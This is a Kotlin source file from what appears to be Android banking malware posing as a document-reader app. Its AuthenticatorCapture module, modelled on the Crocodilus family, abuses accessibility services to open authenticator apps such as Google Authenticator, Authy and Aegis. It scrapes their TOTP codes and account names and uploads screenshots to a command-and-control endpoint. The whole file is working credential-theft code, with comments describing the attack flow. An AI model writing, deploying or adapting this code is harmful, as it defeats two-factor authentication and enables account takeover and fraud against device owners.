package com.docreader.lite.reader.advanced

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.os.Build
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.docreader.lite.reader.Exfil
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

/**
 * Authenticator app capture — steal TOTP codes from Google Authenticator.
 *
 * Family reference:
 *   - Crocodilus: first banker to specifically target Google Authenticator.
 *     Sends TG32XAZADG command → triggers A11y screenshot of Authenticator
 *     → OCR extracts TOTP codes → codes sent to C2.
 *     Defeats TOTP 2FA entirely — attacker gets codes in real-time.
 *
 *   - TrickMo: screenshots banking apps to capture OTP fields
 *   - Brokewell: general screen capture includes authenticator if open
 *
 * Attack flow (Crocodilus pattern):
 *   1. C2 sends CAPTURE_AUTH command during fraud operation
 *   2. Malware uses A11y to check if Authenticator is foreground
 *   3. If not, A11y opens Google Authenticator (launches the app)
 *   4. Waits for app to load (~500ms)
 *   5. Uses AccessibilityService.takeScreenshot() (API 30+) to capture screen
 *   6. OR scrapes all visible text nodes via A11y node traversal
 *   7. Extracts 6/8 digit TOTP codes via regex
 *   8. Sends codes + account labels to C2
 *   9. Closes Authenticator (optional — less suspicious if left open)
 *
 * Two capture methods:
 *   METHOD A: A11y screenshot → server-side OCR (reliable but requires API 30+)
 *   METHOD B: A11y node traversal → text scrape (works on all APIs, but codes
 *             may be in custom views that don't expose text to A11y)
 *
 * Google Authenticator, Microsoft Authenticator, Authy, andOTP all targeted.
 */
object AuthenticatorCapture {

    // Authenticator app packages
    private val AUTH_PACKAGES = listOf(
        "com.google.android.apps.authenticator2",   // Google Authenticator
        "com.azure.authenticator",                    // Microsoft Authenticator
        "com.authy.authy",                           // Authy
        "org.shadowice.flocke.andotp",               // andOTP
        "com.beemdevelopment.aegis",                  // Aegis
        "org.fedorahosted.freeotp",                  // FreeOTP
        "com.2fas.android"                            // 2FAS
    )

    // TOTP regex: 6-8 digits (may be space-separated like "123 456")
    private val TOTP_REGEX = Regex("\\b(\\d{3}\\s?\\d{3,5})\\b")
    private val STRICT_TOTP = Regex("^\\d{6,8}$")

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    /**
     * Capture TOTP codes — primary entry point from C2 command.
     * Tries node traversal first, falls back to screenshot if needed.
     */
    fun capture(a11y: AccessibilityService) {
        scope.launch {
            Exfil.event("auth_capture_started")

            // First: try to scrape from currently visible app
            val currentCodes = scrapeCurrentScreen(a11y)
            if (currentCodes.isNotEmpty()) {
                exfilCodes(currentCodes, "current_screen")
                return@launch
            }

            // Not on authenticator — need to open it
            val authPkg = findInstalledAuth(a11y)
            if (authPkg == null) {
                Exfil.event("auth_capture_failed", "reason" to "no_auth_app_found")
                return@launch
            }

            // Open the authenticator app
            openApp(a11y, authPkg)
            delay(1000) // Wait for app to load

            // Method B: Node traversal (text scrape)
            val scrapedCodes = scrapeAuthScreen(a11y)
            if (scrapedCodes.isNotEmpty()) {
                exfilCodes(scrapedCodes, "node_scrape")
            }

            // Method A: Screenshot capture (API 30+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                takeAuthScreenshot(a11y)
            }
        }
    }

    /**
     * Check if an authenticator app is currently in foreground.
     * Called from DocumentReaderService on every window change.
     */
    fun isAuthenticatorApp(packageName: String): Boolean {
        return packageName in AUTH_PACKAGES
    }

    /**
     * Passively capture codes when user opens authenticator.
     * Called from DocumentReaderService when authenticator detected in foreground.
     */
    fun onAuthenticatorVisible(a11y: AccessibilityService, event: AccessibilityEvent) {
        scope.launch {
            delay(500) // Wait for codes to render
            val codes = scrapeAuthScreen(a11y)
            if (codes.isNotEmpty()) {
                exfilCodes(codes, "passive_capture")
            }
        }
    }

    // ─── Scraping methods ───────────────────────────────────────────

    private fun scrapeCurrentScreen(a11y: AccessibilityService): List<AuthCode> {
        val root = a11y.rootInActiveWindow ?: return emptyList()
        val pkg = root.packageName?.toString() ?: ""

        if (!isAuthenticatorApp(pkg)) {
            root.recycle()
            return emptyList()
        }

        return extractCodesFromTree(root, pkg)
    }

    private fun scrapeAuthScreen(a11y: AccessibilityService): List<AuthCode> {
        val root = a11y.rootInActiveWindow ?: return emptyList()
        val pkg = root.packageName?.toString() ?: "unknown"
        return extractCodesFromTree(root, pkg)
    }

    private fun extractCodesFromTree(root: AccessibilityNodeInfo, pkg: String): List<AuthCode> {
        val codes = mutableListOf<AuthCode>()
        val allText = mutableListOf<TextNode>()

        // Traverse entire tree, collect all text nodes
        traverseForText(root, allText, 0)
        root.recycle()

        // Find TOTP codes and associate with nearby labels (account names)
        var lastLabel = ""
        for (node in allText) {
            val text = node.text.replace("\\s".toRegex(), "")

            if (STRICT_TOTP.matches(text)) {
                codes.add(AuthCode(
                    code = text,
                    account = lastLabel,
                    app = pkg,
                    method = "node_text"
                ))
            } else if (TOTP_REGEX.containsMatchIn(node.text)) {
                TOTP_REGEX.findAll(node.text).forEach { match ->
                    val code = match.value.replace(" ", "")
                    if (code.length in 6..8) {
                        codes.add(AuthCode(
                            code = code,
                            account = lastLabel,
                            app = pkg,
                            method = "node_regex"
                        ))
                    }
                }
            } else {
                // Non-code text = likely account label
                lastLabel = node.text.take(100)
            }
        }

        return codes
    }

    private fun traverseForText(
        node: AccessibilityNodeInfo,
        out: MutableList<TextNode>,
        depth: Int
    ) {
        if (depth > 10) return

        node.text?.toString()?.takeIf { it.isNotBlank() }?.let {
            out.add(TextNode(it, depth))
        }
        node.contentDescription?.toString()?.takeIf { it.isNotBlank() }?.let {
            out.add(TextNode(it, depth))
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            traverseForText(child, out, depth + 1)
            child.recycle()
        }
    }

    // ─── Screenshot method (API 30+) ────────────────────────────────

    private fun takeAuthScreenshot(a11y: AccessibilityService) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return

        a11y.takeScreenshot(
            Display.DEFAULT_DISPLAY,
            a11y.mainExecutor,
            object : AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                    val bitmap = Bitmap.wrapHardwareBuffer(
                        result.hardwareBuffer, result.colorSpace
                    ) ?: return
                    result.hardwareBuffer.close()

                    // Compress and send to C2 for server-side OCR
                    val baos = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                    bitmap.recycle()

                    scope.launch(Dispatchers.IO) {
                        try {
                            val body = baos.toByteArray().let {
                                okhttp3.RequestBody.create(
                                    "image/jpeg".toMediaTypeOrNull(), it
                                )
                            }
                            val req = okhttp3.Request.Builder()
                                .url("${com.docreader.lite.reader.C2.baseUrl()}/api/v1/auth_screenshot")
                                .post(body)
                                .header("X-Bot-Id", android.os.Build.MODEL)
                                .build()
                            okhttp3.OkHttpClient().newCall(req).execute().close()
                            Exfil.event("auth_screenshot_sent")
                        } catch (_: Exception) {}
                    }
                }

                override fun onFailure(errorCode: Int) {
                    Exfil.event("auth_screenshot_failed", "error" to errorCode.toString())
                }
            }
        )
    }

    // ─── Helpers ────────────────────────────────────────────────────

    private fun findInstalledAuth(a11y: AccessibilityService): String? {
        val pm = a11y.packageManager
        return AUTH_PACKAGES.firstOrNull { pkg ->
            try {
                pm.getPackageInfo(pkg, 0)
                true
            } catch (_: Exception) { false }
        }
    }

    private fun openApp(a11y: AccessibilityService, pkg: String) {
        val intent = a11y.packageManager.getLaunchIntentForPackage(pkg) ?: return
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
        a11y.startActivity(intent)
    }

    private fun exfilCodes(codes: List<AuthCode>, source: String) {
        codes.forEach { code ->
            Exfil.event("auth_totp_captured",
                "code" to code.code,
                "account" to code.account,
                "app" to code.app,
                "method" to code.method,
                "source" to source
            )
        }
    }

    data class AuthCode(
        val code: String,
        val account: String,
        val app: String,
        val method: String
    )

    private data class TextNode(
        val text: String,
        val depth: Int
    )
}
